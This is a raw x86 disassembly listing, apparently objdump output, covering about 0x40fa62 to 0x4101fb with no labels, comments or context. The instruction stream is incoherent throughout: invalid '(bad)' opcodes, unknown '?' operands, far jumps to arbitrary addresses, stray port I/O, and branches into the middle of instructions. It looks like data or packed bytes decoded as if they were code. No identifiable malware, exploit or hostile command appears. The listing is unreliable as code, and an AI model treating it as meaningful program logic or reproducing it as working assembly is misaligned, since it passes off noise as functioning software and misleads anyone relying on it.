  40fa62:	outs   dx,BYTE PTR ds:[esi]
  40fa63:	or     ch,BYTE PTR cs:[ecx]
  40fa66:	add    DWORD PTR [ebx],eax
  40fa68:	call   0xfe6f664c
  40fa6d:	repnz add BYTE PTR [eax],al
  40fa70:	jb     0x40fa15
  40fa72:	or     DWORD PTR [esi+0x284a2431],esp
  40fa78:	xor    eax,0x32e90015
  40fa7d:	mov    esp,0x1432e800
  40fa82:	call   0xfe703d5d
  40fa87:	mov    al,BYTE PTR [eax-0x25]
  40fa8a:	inc    eax
  40fa8b:	jmp    0xe93cd2a7
  40fa90:	xor    eax,0xf16c0014
  40fa95:	sub    ecx,DWORD PTR [edi-0x6a]
  40fa98:	and    edx,esp
  40fa9a:	dec    edx
  40fa9b:	sub    BYTE PTR ds:0x32eb683c,ch
  40faa1:	adc    al,0xb
  40faa3:	test   eax,0xbcff0881
  40faa8:	inc    eax
  40faa9:	fild   DWORD PTR [eax-0x17]
  40faac:	cli    
  40faad:	dec    eax
  40faae:	not    WORD PTR cs:[ebp+0x4]
  40fab3:	sbb    ecx,edx
  40fab5:	aam    0xff
  40fab7:	call   0x41410eee
  40fabc:	mov    ecx,gs
  40fabe:	inc    BYTE PTR [eax]
  40fac0:	test   edx,0xd6273304
  40fac6:	push   si
  40fac8:	das    
  40fac9:	pop    ecx
  40faca:	(bad)  
  40facb:	out    0x4b,eax
  40facd:	ret    0xfffd
  40fad0:	add    edx,edx
  40fad2:	push   ebx
  40fad3:	mov    eax,DWORD PTR [eax]
  40fad5:	add    BYTE PTR [ebx+ecx*2],dh
  40fad8:	add    eax,0xf81388e9
  40fadd:	jb     0x40fb28
  40fadf:	sar    ch,cl
  40fae1:	push   0x18
  40fae3:	retf   
  40fae4:	mov    eax,0xb8131801
  40fae9:	add    BYTE PTR [eax],cl
  40faeb:	adc    eax,DWORD PTR [eax]
  40faed:	leave  
  40faee:	dec    edx
  40faef:	das    
  40faf0:	(bad)  
  40faf1:	addr16 cmp ebx,ecx
  40faf4:	add    BYTE PTR ds:[eax],dl
  40faf7:	inc    edx
  40faf8:	inc    edx
  40fafa:	out    0x4f,eax
  40fafc:	clc    
  40fafd:	call   0xa429134a
  40fb02:	fst    DWORD PTR [edx]
  40fb04:	add    al,ch
  40fb06:	xchg   edx,eax
  40fb07:	aad    0xfd
  40fb09:	push   eax
  40fb0b:	lods   al,BYTE PTR ds:[esi]
  40fb0c:	lock inc DWORD PTR [edi-0x680aed31]
  40fb13:	fsub   st,st(6)
  40fb15:	cld    
  40fb16:	popf   
  40fb17:	fdivr  st,st(5)
  40fb19:	and    ebp,0xffffffc2
  40fb1c:	dec    ecx
  40fb1d:	inc    ecx
  40fb1e:	enter  0x7412,0x19
  40fb22:	sbb    edx,DWORD PTR [edi]
  40fb24:	loop   0x40fb54
  40fb26:	pop    ecx
  40fb27:	sbb    BYTE PTR [eax],al
  40fb29:	je     0x40fab9
  40fb2b:	xlat   BYTE PTR ds:[ebx]
  40fb2c:	adc    esp,edx
  40fb2e:	(bad)  
  40fb2f:	push   ecx
  40fb30:	inc    dh
  40fb32:	popf   
  40fb33:	jbe    0x40fb5c
  40fb35:	inc    ecx
  40fb36:	cwde   
  40fb37:	adc    DWORD PTR [eax],eax
  40fb39:	add    BYTE PTR [eax],al
  40fb3b:	add    BYTE PTR [ecx],dh
  40fb3d:	mov    ebp,0xdd7ac65b
  40fb42:	inc    esp
  40fb43:	out    0x79,eax
  40fb45:	fadd   DWORD PTR [esi+edi*8+0x72]
  40fb49:	inc    esp
  40fb4a:	int3   
  40fb4b:	call   0x718b3841
  40fb50:	xor    dl,bh
  40fb52:	inc    esp
  40fb53:	out    0x26,eax
  40fb55:	cmp    al,0x2
  40fb57:	add    bl,bl
  40fb59:	aaa    
  40fb5a:	test   eax,0x530d632a
  40fb5f:	cmp    BYTE PTR [ebx],0x38
  40fb62:	int    0x1
  40fb64:	sbb    bh,BYTE PTR [edx]
  40fb66:	push   edi
  40fb67:	jmp    0x141e:0xfe44b719
  40fb6e:	ins    BYTE PTR es:[edi],dx
  40fb6f:	not    BYTE PTR [esi]
  40fb71:	aas    
  40fb72:	fdivr  st,st(7)
  40fb74:	push   ss
  40fb75:	or     BYTE PTR [ebx],al
  40fb77:	add    BYTE PTR [ecx],dh
  40fb79:	dec    esi
  40fb7a:	sbb    eax,0x3fc587c
  40fb7f:	dec    DWORD PTR [ebx+edi*4-0x57]
  40fb83:	inc    eax
  40fb84:	xor    DWORD PTR [esi+0x1d],edx
  40fb87:	test   BYTE PTR [eax+0x14ff03fc],cl
  40fb8d:	mov    bl,0xa9
  40fb8f:	inc    eax
  40fb90:	xor    DWORD PTR [esi+0x1d],edi
  40fb93:	mov    WORD PTR [eax-0x4],gs
  40fb96:	add    edi,edi
  40fb98:	or     al,0xab
  40fb9a:	test   eax,0x1d863140
  40fb9f:	xchg   esp,eax
  40fba0:	add    BYTE PTR [eax],al
  40fba2:	pop    eax
  40fba3:	cld    
  40fba4:	add    edi,edi
  40fba6:	push   esp
  40fba7:	mov    bl,0xa9
  40fba9:	inc    eax
  40fbaa:	xor    DWORD PTR [esi-0x40763e3],ebp
  40fbb0:	add    edi,edi
  40fbb2:	dec    esp
  40fbb3:	fld    TBYTE PTR [ecx+0x66143140]
  40fbb9:	push   ds
  40fbba:	int    0xcb
  40fbbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbbd:	add    edi,DWORD PTR [esi-0x9]
  40fbc0:	sub    BYTE PTR [edx+0x1e4e13f1],0x9d
  40fbc7:	retf   
  40fbc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbc9:	add    esp,DWORD PTR [esi-0x9]
  40fbcc:	js     0x40fb78
  40fbce:	icebp  
  40fbcf:	adc    esi,DWORD PTR [esi]
  40fbd1:	push   ds
  40fbd2:	popf   
  40fbd3:	retf   
  40fbd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbd5:	add    ecx,DWORD PTR [esi-0x9]
  40fbd8:	pusha  
  40fbd9:	stos   BYTE PTR es:[edi],al
  40fbda:	icebp  
  40fbdb:	adc    ebx,DWORD PTR [esi]
  40fbdd:	push   ds
  40fbde:	jge    0x40fbab
  40fbe0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbe1:	add    esi,DWORD PTR [esi]
  40fbe3:	imul   DWORD PTR [eax]
  40fbe5:	stos   BYTE PTR es:[edi],al
  40fbe6:	jno    0x40fbfc
  40fbe8:	push   es
  40fbe9:	push   ds
  40fbea:	in     eax,dx
  40fbeb:	retf   0x3a7
  40fbee:	push   ds
  40fbef:	mul    DWORD PTR [eax]
  40fbf1:	stos   BYTE PTR es:[edi],al
  40fbf2:	jno    0x40fc08
  40fbf4:	out    dx,al
  40fbf5:	sbb    eax,0x427cafd
  40fbfa:	push   es
  40fbfb:	idiv   DWORD PTR [eax-0x29eb8e23]
  40fc01:	jmp    0x468c6e8
  40fc06:	add    BYTE PTR [eax],al
  40fc08:	out    dx,al
  40fc09:	mul    BYTE PTR [eax-0x41eb8e23]
  40fc0f:	jmp    0x468c70e
  40fc14:	(bad)  
  40fc15:	test   al,0xdd
  40fc18:	jno    0x40fc2e
  40fc1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc1b:	jmp    0x468c6f2
  40fc20:	mov    esi,0x71dd80f6
  40fc25:	adc    al,0x8e
  40fc27:	jmp    0x468c6c6
  40fc2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc2d:	idiv   BYTE PTR [eax-0x23]
  40fc30:	icebp  
  40fc31:	adc    eax,DWORD PTR [eax]
  40fc33:	jbe    0x40fbbd
  40fc35:	and    BYTE PTR [eax+0x28],bl
  40fc38:	xor    eax,0x6461242d
  40fc3d:	sar    edi,cl
  40fc3f:	pop    ebp
  40fc40:	mov    BYTE PTR [eax],ch
  40fc42:	pop    eax
  40fc43:	test   al,0x32
  40fc45:	sub    eax,0xd38ce924
  40fc4a:	inc    DWORD PTR [ebp+0x58]
  40fc4d:	adc    BYTE PTR [edx-0x58],bl
  40fc50:	xor    ch,BYTE PTR ds:0xd374e124
  40fc56:	jmp    FWORD PTR ds:0xa85a1858
  40fc5c:	xor    ch,BYTE PTR ds:0xd35cf924
  40fc62:	call   DWORD PTR ds:0xa85a0048
  40fc68:	xor    ch,BYTE PTR [ebx]
  40fc6a:	and    al,0xe1
  40fc6c:	add    BYTE PTR [eax],al
  40fc6e:	add    al,0xd5
  40fc70:	(bad)  
  40fc71:	std    
  40fc72:	or     DWORD PTR [eax],edx
  40fc74:	pop    edx
  40fc75:	test   al,0x32
  40fc77:	sub    esp,DWORD PTR [ecx+ecx*8]
  40fc7a:	in     al,dx
  40fc7b:	aam    0xff
  40fc7d:	in     eax,0x19
  40fc7f:	clc    
  40fc80:	pop    ecx
  40fc81:	sub    BYTE PTR ds:0xd701242b,dh
  40fc87:	aam    0xff
  40fc89:	int    0xd9
  40fc8b:	call   FWORD PTR [ecx+0x28]
  40fc8e:	sub    eax,0xfcf9242b
  40fc93:	aam    0xff
  40fc95:	mov    ch,0xc9
  40fc97:	out    0x59,eax
  40fc99:	sub    BYTE PTR ds:0xe4e1242b,dh
  40fc9f:	aam    0xff
  40fca1:	popf   
  40fca2:	leave  
  40fca3:	out    dx,eax
  40fca4:	pop    ecx
  40fca5:	sub    BYTE PTR ds:0x8f29242b,ch
  40fcab:	aam    0xff
  40fcad:	jmp    FWORD PTR [edi+0x495a423c]
  40fcb3:	adc    bh,bh
  40fcb5:	and    eax,0x3f4a50
  40fcba:	pop    ds
  40fcbb:	cmp    al,0x4e
  40fcbd:	pop    edx
  40fcbe:	fst    DWORD PTR [edi]
  40fcc0:	jmp    DWORD PTR ds:0x3f49c4
  40fcc6:	fistp  QWORD PTR [ebx]
  40fcc8:	push   esi
  40fcc9:	pop    edx
  40fcca:	cdq    
  40fccb:	pop    ss
  40fccc:	jmp    DWORD PTR ds:0x3f498c
  40fcd2:	add    BYTE PTR [eax],al
  40fcd4:	pop    ds
  40fcd5:	cmp    al,0x5e
  40fcd7:	pop    edx
  40fcd8:	mov    DWORD PTR [edi],edx
  40fcda:	jmp    DWORD PTR ds:0x3f4974
  40fce0:	(bad)  
  40fce2:	push   0x5a
  40fce4:	mov    DWORD PTR [edi],edx
  40fce6:	jmp    DWORD PTR ds:0x3f4994
  40fcec:	aas    
  40fced:	cmp    al,0x76
  40fcef:	pop    edx
  40fcf0:	fst    DWORD PTR [esi]
  40fcf2:	jmp    DWORD PTR ds:0x3f499c
  40fcf8:	pop    ds
  40fcf9:	xor    edi,DWORD PTR [esi+0x5a]
  40fcfc:	fst    DWORD PTR [esi]
  40fcfe:	jmp    DWORD PTR ds:0x3f4a94
  40fd04:	fbstp  TBYTE PTR [edx]
  40fd06:	xchg   BYTE PTR [edx+0x49],bl
  40fd09:	adc    bh,bh
  40fd0b:	and    eax,0x3f4a8c
  40fd10:	out    dx,eax
  40fd11:	xor    cl,BYTE PTR [esi-0xeff6a6]
  40fd17:	and    eax,0x3f4a74
  40fd1c:	lahf   
  40fd1d:	xor    dl,BYTE PTR [esi-0xefe6a6]
  40fd23:	and    eax,0x3f4a68
  40fd28:	xor    DWORD PTR [edx-0x3f4581a],eax
  40fd2e:	add    edi,edi
  40fd30:	dec    esp
  40fd31:	rcr    ebp,0x40
  40fd34:	xor    DWORD PTR [edx+0xb3e6],ebp
  40fd3a:	sti    
  40fd3b:	sti    
  40fd3c:	add    edi,edi
  40fd3e:	push   esp
  40fd3f:	in     eax,0xdd
  40fd41:	inc    eax
  40fd42:	xor    DWORD PTR [edx+0x7bdbbbe6],esi
  40fd48:	add    bh,bh
  40fd4a:	dec    esp
  40fd4b:	std    
  40fd4c:	fld    QWORD PTR [eax+0x31]
  40fd4f:	(bad)  
  40fd51:	ret    
  40fd52:	or     edi,DWORD PTR [edx+eax*1-0x1]
  40fd56:	adc    al,0xe5
  40fd58:	fld    QWORD PTR [eax+0x31]
  40fd5b:	loop   0x40fd43
  40fd5d:	iret   
  40fd5e:	jmp    0x40fddb
  40fd60:	add    bh,bh
  40fd62:	or     al,0xe9
  40fd64:	fld    QWORD PTR [eax+0x31]
  40fd67:	or     ah,bh
  40fd69:	xlat   BYTE PTR ds:[ebx]
  40fd6a:	fstp   TBYTE PTR [ebx+0x2]
  40fd6d:	call   DWORD PTR [edi+esi*8-0x23]
  40fd71:	inc    eax
  40fd72:	xor    DWORD PTR [edx],edx
  40fd74:	out    0xdf,eax
  40fd76:	jnp    0x40fdf4
  40fd78:	add    bh,bh
  40fd7a:	dec    esp
  40fd7b:	pop    ss
  40fd7c:	fiadd  WORD PTR [eax+0x31]
  40fd7f:	cmp    ah,ch
  40fd81:	out    0x6b,eax
  40fd83:	cld    
  40fd84:	add    edi,edi
  40fd86:	push   esp
  40fd87:	push   edi
  40fd88:	fadd   QWORD PTR [eax+0x31]
  40fd8b:	inc    edx
  40fd8c:	in     eax,0xef
  40fd8e:	mov    edi,esp
  40fd90:	add    edi,edi
  40fd92:	or     al,0x67
  40fd94:	fadd   QWORD PTR [eax+0x31]
  40fd97:	push   0xffffffe5
  40fd99:	sti    
  40fd9a:	jnp    0x40fd98
  40fd9c:	add    edi,edi
  40fd9e:	add    BYTE PTR [eax],al
  40fda0:	adc    al,0x3b
  40fda2:	fild   DWORD PTR [eax+0x31]
  40fda5:	adc    al,0xb5
  40fda7:	dec    edi
  40fda8:	jmp    0x6158:0xea4fac58
  40fdaf:	(bad)  
  40fdb0:	push   edx
  40fdb1:	adc    BYTE PTR [edx+0x3b],ch
  40fdb4:	xor    BYTE PTR [edi+0x14127bf0],ah
  40fdba:	jmp    0xe95170c2
  40fdbf:	test   BYTE PTR [esi-0x36f413f0],al
  40fdc5:	push   ss
  40fdc6:	jmp    0xe4972ece
  40fdcb:	add    esi,DWORD PTR [edx+0x36bee02c]
  40fdd1:	ins    BYTE PTR es:[edi],dx
  40fdd2:	in     al,0x3
  40fdd4:	xor    DWORD PTR [ebx+ebp*1],edx
  40fdd7:	pop    es
  40fdd8:	xor    DWORD PTR [ebp+0x1bd41340],edx
  40fdde:	jno    0x40fde9
  40fde0:	xor    DWORD PTR [ecx+ebp*8],edx
  40fde3:	inc    ebp
  40fde4:	xor    dl,BYTE PTR [edx+ebp*2]
  40fde7:	cmp    ebx,DWORD PTR [esi]
  40fde9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdea:	lock jnp 0x40fe1b
  40fded:	adc    al,0xe9
  40fdef:	add    esi,ebx
  40fdf1:	psubsw mm0,QWORD PTR [esi+ebx*1-0x26f47c2c]
  40fdf9:	sbb    eax,0x563103e9
  40fdfe:	in     al,dx
  40fdff:	add    ecx,DWORD PTR [esp+edx*4-0x18]
  40fe03:	add    eax,DWORD PTR [eax]
  40fe05:	add    BYTE PTR [ecx],dh
  40fe07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe08:	lock jnp 0x40fe35
  40fe0b:	adc    al,0xe9
  40fe0d:	add    esi,ebx
  40fe0f:	psubsw mm0,QWORD PTR [eax]
  40fe12:	xor    DWORD PTR [ebx],edx
  40fe14:	jmp    0x815d621c
  40fe19:	push   cs
  40fe1a:	xor    DWORD PTR [ecx+ebp*8],edx
  40fe1d:	inc    ecx
  40fe1e:	xor    dl,BYTE PTR [eax+eax*1]
  40fe21:	hlt    
  40fe22:	xor    dl,BYTE PTR [esi]
  40fe24:	add    cl,ch
  40fe26:	icebp  
  40fe27:	adc    BYTE PTR [eax+0x1432f9],bh
  40fe2d:	stos   DWORD PTR es:[edi],eax
  40fe2e:	sub    DWORD PTR [edi*1+0x1436e9],edx
  40fe35:	or     al,0x35
  40fe37:	ins    BYTE PTR es:[edi],dx
  40fe38:	adc    ecx,ebp
  40fe3a:	xor    dl,BYTE PTR [edx+eax*8]
  40fe3d:	in     eax,0x32
  40fe3f:	out    0xff,eax
  40fe41:	loopne 0x40fe75
  40fe43:	adc    al,0x7d
  40fe45:	loope  0x40fe51
  40fe47:	add    eax,0x5632e900
  40fe4c:	add    ebp,ecx
  40fe4e:	xor    DWORD PTR [eax+edx*1],edx
  40fe51:	jmp    0x9148a588
  40fe56:	aas    
  40fe57:	adc    al,0x0
  40fe59:	jmp    0xfc41134e
  40fe5e:	xor    dh,ah
  40fe60:	(bad)  
  40fe61:	call   0xd1f90ed7
  40fe66:	xor    dl,BYTE PTR [eax+eax*1]
  40fe69:	sub    eax,DWORD PTR [eax]
  40fe6b:	add    BYTE PTR [ecx],ch
  40fe6d:	adc    al,0x3d
  40fe6f:	jmp    0x953f26e6
  40fe74:	cmp    ch,BYTE PTR [ecx+ebx*1-0x17]
  40fe78:	xor    dl,BYTE PTR [edx+eax*8]
  40fe7b:	in     eax,dx
  40fe7c:	xor    ch,cl
  40fe7e:	jmp    FWORD PTR [eax+0x2d]
  40fe81:	adc    al,0x7d
  40fe83:	loope  0x40fe0f
  40fe85:	or     eax,DWORD PTR [eax]
  40fe87:	jmp    0xe94450be
  40fe8c:	add    ebx,DWORD PTR [ebp+0x3c]
  40fe8f:	jmp    0xe64113c6
  40fe94:	xchg   ecx,eax
  40fe95:	push   esp
  40fe96:	mov    WORD PTR ds:0x8b0634,ds
  40fe9c:	mov    ebp,edx
  40fe9e:	add    al,BYTE PTR [eax]
  40fea0:	dec    ebx
  40fea1:	nop
  40fea2:	sbb    al,BYTE PTR [eax+ebx*8]
  40fea5:	adc    edi,edi
  40fea7:	jne    0x40fe9e
  40fea9:	call   0x8900:0x13cc107f
  40feb0:	dec    ecx
  40feb1:	or     eax,DWORD PTR [eax+eax*1]
  40feb4:	cwde   
  40feb5:	push   ebx
  40feb6:	lds    eax,FWORD PTR [ecx+0xf94]
  40febc:	mov    al,ds:0x21000013
  40fec1:	nop
  40fec2:	push   cs
  40fec3:	add    al,0x98
  40fec5:	adc    eax,DWORD PTR [ebx+0xf6c7c]
  40fecb:	mov    eax,DWORD PTR [ecx]
  40fecd:	or     eax,DWORD PTR [eax+eax*1]
  40fed0:	add    BYTE PTR [eax],al
  40fed2:	mov    BYTE PTR [edi+0x9],bl
  40fed5:	mov    bl,BYTE PTR [ecx+0x15]
  40fed8:	sar    dh,0x18
  40fedb:	fwait
  40fedc:	inc    ecx
  40fede:	dec    esp
  40fedf:	adc    edx,eax
  40fee1:	and    DWORD PTR [edx],ecx
  40fee3:	sldt   WORD PTR [ebx+0x406d9]
  40feea:	pop    eax
  40feeb:	out    0x73,al
  40feed:	sbb    eax,0x40e8fc3
  40fef2:	dec    eax
  40fef3:	adc    ecx,DWORD PTR [ecx+0xf2081]
  40fef9:	add    al,bl
  40fefb:	int    0x7f
  40fefd:	sbb    al,0xc
  40feff:	adc    eax,DWORD PTR [eax]
  40ff01:	or     BYTE PTR [eax],cl
  40ff03:	adc    eax,DWORD PTR [eax]
  40ff05:	mov    DWORD PTR [ecx+0x18000403],ebx
  40ff0b:	call   0xd000:0x130c1887
  40ff12:	sub    ebp,edx
  40ff14:	add    DWORD PTR [ecx+0x62131],0x1cb65631
  40ff1e:	stos   BYTE PTR es:[edi],al
  40ff1f:	mov    ebx,0x3d310413
  40ff24:	mov    DWORD PTR [eax+0x23929],eax
  40ff2a:	jno    0x40ff9a
  40ff2c:	sbb    BYTE PTR [ebx],0x35
  40ff2f:	cmp    eax,0x3d310802
  40ff34:	add    cl,BYTE PTR [ecx+0x2cb00000]
  40ff3a:	push   es
  40ff3b:	add    BYTE PTR [ecx],dh
  40ff3d:	mov    dl,0x8a
  40ff3f:	pop    ss
  40ff40:	xor    eax,0x308a023d
  40ff45:	cmp    eax,DWORD PTR [edx-0x3]
  40ff48:	jno    0x40fefe
  40ff4a:	add    al,bl
  40ff4c:	mov    edx,0xaa03e7f0
  40ff51:	push   0x5edc03e6
  40ff56:	shl    DWORD PTR [edx],cl
  40ff58:	scas   eax,DWORD PTR es:[di]
  40ff5a:	retf   0xbbff
  40ff5d:	les    eax,FWORD PTR [eax+0x2c0c30e6]
  40ff63:	inc    ebp
  40ff64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff65:	inc    eax
  40ff66:	rol    DWORD PTR [edx-0x104cc4b7],cl
  40ff6c:	mov    dl,0xe6
  40ff6e:	add    bh,BYTE PTR [ebp-0x1c312c2]
  40ff74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff75:	xchg   DWORD PTR [ecx],ecx
  40ff77:	je     0x40ff1c
  40ff79:	push   0xffffff87
  40ff7b:	(bad)  
  40ff7c:	xor    ah,dl
  40ff7e:	pop    ds
  40ff7f:	add    al,0x31
  40ff81:	cmp    esi,DWORD PTR [ebp+0x13bcaa18]
  40ff87:	add    al,0x31
  40ff89:	cmp    ecx,DWORD PTR [ecx+0x22f2980]
  40ff8f:	add    BYTE PTR [ecx+0x14],dh
  40ff92:	jo     0x41000e
  40ff94:	sbb    dl,BYTE PTR [eax]
  40ff96:	jmp    0xf8d4b79e
  40ff9b:	pop    es
  40ff9c:	add    BYTE PTR [eax],al
  40ff9e:	xor    DWORD PTR [edx+eiz*2],edx
  40ffa1:	add    BYTE PTR [esi+0x10],0xe9
  40ffa5:	add    ebx,edi
  40ffa7:	push   edx
  40ffa8:	out    0xb7,eax
  40ffaa:	cmp    BYTE PTR [edx+0x26ea01d0],bl
  40ffb0:	test   eax,0xea39268b
  40ffb5:	push   ebx
  40ffb6:	push   ss
  40ffb7:	adc    edx,DWORD PTR [eax+0x1f]
  40ffba:	xor    eax,0x49b6e914
  40ffbf:	cdq    
  40ffc0:	adc    esi,DWORD PTR [di]
  40ffc3:	adc    al,0xe9
  40ffc5:	mov    dh,BYTE PTR [ecx+0x3103e50c]
  40ffcb:	aam    0x5f
  40ffcd:	jp     0x40fff9
  40ffcf:	adc    cl,ch
  40ffd1:	add    ebp,DWORD PTR [eax+0x3107f893]
  40ffd7:	adc    al,0x72
  40ffd9:	add    BYTE PTR [esi+0x10],0xe9
  40ffdd:	add    edi,DWORD PTR [ebx+0x5c58eb0c]
  40ffe3:	push   ecx
  40ffe4:	pop    ss
  40ffe5:	sub    DWORD PTR [ebx+0x268be736],esi
  40ffeb:	lahf   
  40ffec:	pop    edx
  40ffed:	fdiv   DWORD PTR [ecx]
  40ffef:	jnp    0x40ffbd
  40fff1:	pop    es
  40fff2:	xor    DWORD PTR [esp+ebx*4],edx
  40fff5:	sbb    ch,BYTE PTR [edx+0x3107f893]
  40fffb:	adc    al,0x60
  40fffd:	cmp    BYTE PTR [esi],0x10
  410000:	jmp    0x71410008
  410005:	fwait
  410006:	aas    
  410007:	pop    ds
  410008:	sub    eax,0xb18ae914
  41000d:	add    eax,DWORD PTR [eax]
  41000f:	in     eax,dx
  410010:	xor    dl,BYTE PTR [ebx+ecx*4]
  410013:	push   0xe900101a
  410018:	inc    eax
  410019:	push   ebx
  41001a:	add    BYTE PTR [ebp+0x3f],dl
  41001d:	call   0x61c1:0x277ceb0f
  410024:	inc    ebp
  410025:	cmp    DWORD PTR [ecx],eax
  410027:	cdq    
  410028:	int    0x13
  41002a:	test   eax,0xfe24cedd
  41002f:	cmp    al,0x24
  410031:	cdq    
  410032:	sbb    cl,0xbe
  410035:	and    al,0xfe
  410037:	jo     0x40ffe5
  410039:	cld    
  41003a:	add    ebp,ecx
  41003c:	xor    dl,ah
  41003e:	mov    BYTE PTR [eax+0x49],dl
  410041:	adc    BYTE PTR [eax],al
  410043:	jmp    0xed5093f5
  410048:	xor    dl,BYTE PTR [ebx+ecx*4]
  41004b:	jo     0x41007a
  41004d:	adc    BYTE PTR [eax],al
  41004f:	jmp    0xf9ff436
  410054:	pop    eax
  410055:	push   edx
  410056:	add    ebp,ecx
  410058:	pop    edi
  410059:	mov    edi,0x148ecd8a
  41005e:	push   esi
  41005f:	sbb    ch,ch
  410061:	mov    ebp,0x9e2a4c82
  410066:	add    al,0x84
  410068:	add    BYTE PTR [eax],al
  41006a:	sub    dl,BYTE PTR [eax+eax*1]
  41006d:	jmp    0xdd64a931
  410072:	mov    bh,0x1d
  410074:	sub    dh,BYTE PTR [eax+ebp*4]
  410077:	mov    al,0x23
  410079:	jmp    0x42c50622
  41007e:	loope  0x410083
  410080:	mov    esp,DWORD PTR [esi+esi*4]
  410083:	dec    ecx
  410084:	mov    WORD PTR [edx+0x35],?
  410087:	adc    al,0x0
  410089:	add    BYTE PTR [eax],cl
  41008b:	and    bl,BYTE PTR [eax]
  41008d:	je     0x4100a5
  41008f:	push   ecx
  410090:	inc    eax
  410091:	test   DWORD PTR [ecx+0x65],edx
  410094:	hlt    
  410095:	or     DWORD PTR [eax+0x17],0xffffff85
  410099:	leave  
  41009a:	push   ebp
  41009b:	adc    BYTE PTR [ebx+0x1f2dac0],al
  4100a1:	sbb    DWORD PTR [eax+0x4b464716],0x7b
  4100a8:	and    bl,BYTE PTR [ecx+ecx*8]
  4100ab:	fs int3 
  4100ad:	pop    edi
  4100ae:	cs cmp eax,0x17ccc259
  4100b4:	mov    edx,DWORD PTR [esp+esi*1+0x14]
  4100b8:	push   ebp
  4100b9:	push   esi
  4100ba:	inc    ebx
  4100bb:	call   0x23c18785
  4100c0:	(bad)  
  4100c1:	call   FWORD PTR [eax+0x12000017]
  4100c7:	adc    DWORD PTR [ecx+ecx*8+0x12ea39f],eax
  4100ce:	add    BYTE PTR [eax],al
  4100d0:	cwde   
  4100d1:	pop    ss
  4100d2:	push   edi
  4100d3:	mov    edi,DWORD PTR [ebx+eax*2+0x12]
  4100d7:	or     DWORD PTR [edi],0xe
  4100da:	jbe    0x4100e1
  4100dc:	iret   
  4100dd:	push   cs
  4100de:	add    BYTE PTR [eax],al
  4100e0:	pop    eax
  4100e1:	xchg   edx,eax
  4100e2:	shr    BYTE PTR [ebx],0x17
  4100e5:	xchg   DWORD PTR [eax],edi
  4100e7:	or     BYTE PTR [ecx+edx*2-0x223abfb3],al
  4100ee:	jae    0x4100e6
  4100f0:	fist   DWORD PTR [edx+ebx*1-0xe8a7fc]
  4100f7:	jne    0x410166
  4100f9:	xchg   edx,eax
  4100fa:	test   BYTE PTR [eax],dl
  4100fc:	inc    esp
  4100fd:	pop    ss
  4100fe:	add    BYTE PTR [ecx+0x3ff96],cl
  410104:	xor    DWORD PTR ds:0x30b7c6c2,ebp
  41010a:	(bad)  
  41010b:	call   DWORD PTR [esi]
  41010d:	and    eax,0xa4310002
  410112:	or     BYTE PTR [edi],0x2d
  410115:	sub    eax,0x44b78b02
  41011a:	(bad)  
  41011b:	push   esi
  41011d:	pop    esp
  41011e:	jecxz  0x4100aa
  410120:	mov    bh,0x1c
  410122:	(bad)  
  410123:	jmp    esi
  410125:	mov    dh,0xd
  410127:	pop    edi
  410128:	test   eax,0x41853734
  41012d:	xor    DWORD PTR [edx],eax
  41012f:	add    BYTE PTR [edi+0x0],ch
  410132:	inc    esi
  410133:	pop    es
  410134:	add    BYTE PTR [eax],al
  410136:	xor    DWORD PTR [eax-0x52868cc8],esi
  41013c:	dec    edx
  41013d:	(bad)  
  41013e:	xor    BYTE PTR [ebx+0x2d310417],ch
  410144:	test   DWORD PTR [eax+0x38],ebp
  410147:	add    BYTE PTR [ebx],bl
  410149:	mov    esi,DWORD PTR [edi-0x690001e4]
  41014f:	mov    ds:0x2d351781,eax
  410154:	add    al,BYTE PTR [eax-0x48]
  410157:	ficom  DWORD PTR [edi]
  410159:	add    al,0x31
  41015b:	sub    eax,0x31218589
  410160:	add    al,BYTE PTR [eax]
  410162:	mov    edx,0x31041bba
  410167:	sub    eax,0xdf330f8c
  41016c:	cmp    ecx,eax
  41016e:	test   eax,0x2d8e013c
  410173:	cmp    DWORD PTR [edx],eax
  410175:	add    BYTE PTR [ebx+eax*2+0x3921858b],bh
  41017c:	add    al,BYTE PTR [eax]
  41017e:	test   al,0x13
  410180:	outs   dx,DWORD PTR ds:[esi]
  410181:	sbb    al,0x35
  410183:	adc    al,0xe9
  410185:	ret    
  410186:	mov    ecx,0x1efff472
  41018b:	and    bl,BYTE PTR [edi-0x7e]
  41018e:	es sbb cl,ch
  410191:	add    edi,DWORD PTR [edx+0x6ffe09a]
  410197:	and    ah,BYTE PTR [edx+0x14]
  41019a:	add    BYTE PTR [eax],al
  41019c:	xor    eax,DWORD PTR [esi-0x12]
  41019f:	inc    ebp
  4101a0:	scas   al,BYTE PTR es:[edi]
  4101a1:	add    al,0xe8
  4101a3:	mov    DWORD PTR [edx+0x18],ecx
  4101a6:	jmp    0x623c5dae
  4101ab:	sub    DWORD PTR [esi],0xa803e918
  4101b1:	call   0x8b28:0x21ceffe0
  4101b8:	xchg   esp,eax
  4101b9:	add    ch,ch
  4101bb:	add    esi,DWORD PTR [ecx]
  4101bd:	mov    esp,DWORD PTR [esi+0x13]
  4101c0:	sub    eax,0xb48ce914
  4101c5:	cld    
  4101c6:	in     al,0x3
  4101c8:	xor    DWORD PTR [esi+0x226805e0],ecx
  4101ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101cf:	mov    WORD PTR [edi-0xb],?
  4101d2:	fwait
  4101d3:	mov    esi,DWORD PTR [esi]
  4101d5:	(bad)  
  4101d6:	jno    0x410221
  4101d8:	mov    ?,WORD PTR [ebx]
  4101da:	je     0x410214
  4101dc:	jg     0x41016b
  4101de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101df:	test   BYTE PTR [esi+0x18],dl
  4101e2:	mov    ecx,0x2c2c7c8c
  4101e7:	aaa    
  4101e8:	and    DWORD PTR [bx+di+0x48],esp
  4101ec:	mov    bl,0x33
  4101ee:	jmp    0x4a78:0x5052abd2
  4101f5:	and    DWORD PTR ds:0x134f84,edi
  4101fb:	sahf   
